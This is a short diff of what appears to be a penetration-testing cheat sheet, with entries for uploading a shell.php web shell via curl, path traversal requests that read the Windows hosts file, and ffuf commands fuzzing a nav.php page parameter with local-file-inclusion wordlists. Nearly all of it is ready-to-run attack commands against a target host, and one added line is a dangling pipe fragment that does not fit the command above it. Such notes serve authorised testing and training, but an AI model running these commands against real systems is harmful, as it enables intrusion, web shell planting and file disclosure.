@@ -481,9 +481,9 @@ cat dirsearch.txt | jq -r '.results[] | select(.status==200 and (.url | endswith
 curl --upload-file shell.php http://$TARGET:80/upload/
 
 [*] Path Traversal
+ffuf -u 'http://$TARGET/nav.php?page=../../../../../../../../../../../..FUZZ' -w /usr/share/wordlists/common_lists/lfi_linux.txt -t 30 -rate 300 -v -mc 200 -fw 3
+| strings | grep -oP 'http.*' | cat
 curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../windows/system32/drivers/etc/hosts'
-ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 30 -rate 300 -v -mc 200 \
--w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 
 [*] LFI
 /windows/system32/drivers/etc/hosts
